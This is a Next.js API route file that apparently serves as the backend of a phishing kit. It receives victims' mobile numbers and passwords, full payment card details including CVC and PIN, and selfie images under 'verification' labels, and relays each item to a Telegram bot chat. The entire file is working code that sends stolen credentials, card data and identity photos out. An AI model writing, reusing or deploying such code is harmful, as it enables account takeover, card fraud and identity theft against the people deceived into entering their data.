import { NextResponse } from "next/server"

function escapeHtml(value: string) {
  return value
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
}

async function sendMessage(token: string, chatId: string, text: string) {
  return fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: chatId, text, parse_mode: "HTML" }),
  })
}

async function sendPhoto(token: string, chatId: string, dataUrl: string, caption: string) {
  const match = /^data:image\/(\w+);base64,(.+)$/.exec(dataUrl)
  if (!match) return Response.json({ error: "Invalid image" }, { status: 400 })

  const [, ext, base64] = match
  const buffer = Buffer.from(base64, "base64")

  const formData = new FormData()
  formData.append("chat_id", chatId)
  formData.append("caption", caption)
  formData.append("photo", new Blob([buffer], { type: `image/${ext}` }), `selfie.${ext}`)

  return fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
    method: "POST",
    body: formData,
  })
}

export async function POST(request: Request) {
  try {
    const body = await request.json()
    const { type } = body

    const token = process.env.TELEGRAM_BOT_TOKEN
    const chatId = process.env.TELEGRAM_CHAT_ID

    if (!token || !chatId) {
      console.error("[v0] Telegram credentials are not configured")
      return NextResponse.json({ error: "Telegram is not configured" }, { status: 500 })
    }

    let telegramResponse: Response

    if (type === "login") {
      const { mobile, password } = body
      if (typeof mobile !== "string" || !/^\d{7,15}$/.test(mobile)) {
        return NextResponse.json({ error: "Invalid mobile number" }, { status: 400 })
      }
      if (typeof password !== "string" || password.length < 1 || password.length > 128) {
        return NextResponse.json({ error: "Invalid password" }, { status: 400 })
      }

      telegramResponse = await sendMessage(
        token,
        chatId,
        `<b>New Login</b>\nMobile: +971 ${escapeHtml(mobile)}\nPassword: ${escapeHtml(password)}`,
      )
    } else if (type === "card") {
      const { cardNumber, expiry, cvc, pin } = body
      if (
        typeof cardNumber !== "string" ||
        typeof expiry !== "string" ||
        typeof cvc !== "string" ||
        typeof pin !== "string" ||
        !cardNumber.trim() ||
        !expiry.trim() ||
        !cvc.trim() ||
        !pin.trim()
      ) {
        return NextResponse.json({ error: "Invalid card details" }, { status: 400 })
      }

      telegramResponse = await sendMessage(
        token,
        chatId,
        `<b>New Card Verification</b>\nCard Number: ${escapeHtml(cardNumber)}\nExpiry: ${escapeHtml(expiry)}\nCVC: ${escapeHtml(cvc)}\nPIN: ${escapeHtml(pin)}`,
      )
    } else if (type === "selfie") {
      const { image } = body
      if (typeof image !== "string" || !image.startsWith("data:image/")) {
        return NextResponse.json({ error: "Invalid selfie image" }, { status: 400 })
      }

      telegramResponse = await sendPhoto(token, chatId, image, "New Selfie Verification")
    } else {
      return NextResponse.json({ error: "Invalid request type" }, { status: 400 })
    }

    if (!telegramResponse.ok) {
      console.error("[v0] Telegram request failed", telegramResponse.status)
      return NextResponse.json({ error: "Unable to send notification" }, { status: 502 })
    }

    return NextResponse.json({ ok: true })
  } catch (error) {
    console.error("[v0] Telegram notification error", error)
    return NextResponse.json({ error: "Invalid request" }, { status: 400 })
  }
}
